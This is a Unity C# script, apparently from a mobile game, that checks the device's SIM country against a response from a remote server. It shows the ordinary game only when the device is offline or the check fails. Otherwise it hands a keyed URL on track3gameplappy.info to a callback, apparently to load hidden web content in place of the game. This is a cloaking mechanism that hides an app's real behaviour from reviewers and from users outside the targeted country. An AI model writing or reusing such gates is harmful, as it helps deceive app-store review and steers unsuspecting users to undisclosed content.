using System;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class Manager : MonoBehaviour
{
    private string SIM_GEO
    {
        get => Simcard.GetTwoSmallLetterCountryCodeISO().ToUpper();
    }

    private const string baseUrl = "http://track3gameplappy.info/server2.php";
    private const string baseTarget = "https://track3gameplappy.info/cbqyl1k.php?key=9gv36gpb1v4l31k06389";

    public static Action<string> OnGetResponseFinished { get; set; }

    private IEnumerator Start()
    {
        if(Application.internetReachability == NetworkReachability.NotReachable)
        {
            Screen.fullScreen = true;
            SceneManager.LoadScene(1);
            yield break;
        }

        UnityWebRequest webRequest = UnityWebRequest.Get(baseUrl);
        yield return webRequest.SendWebRequest();

        try
        {
            var response = JsonUtility.FromJson<Response>(webRequest.downloadHandler.text);
            if (string.Equals(response.result, "notcompare_key") || !string.Equals(SIM_GEO, response.geo))
            {
                Screen.fullScreen = true;
                SceneManager.LoadScene(1);
                yield break;
            }
        }
        catch
        {
            Screen.fullScreen = true;
            SceneManager.LoadScene(1);
            yield break;
        }

        OnGetResponseFinished?.Invoke(baseTarget);
    }

    [Serializable]
    public class Response
    {
        public string result;
        public string geo;
    }
}
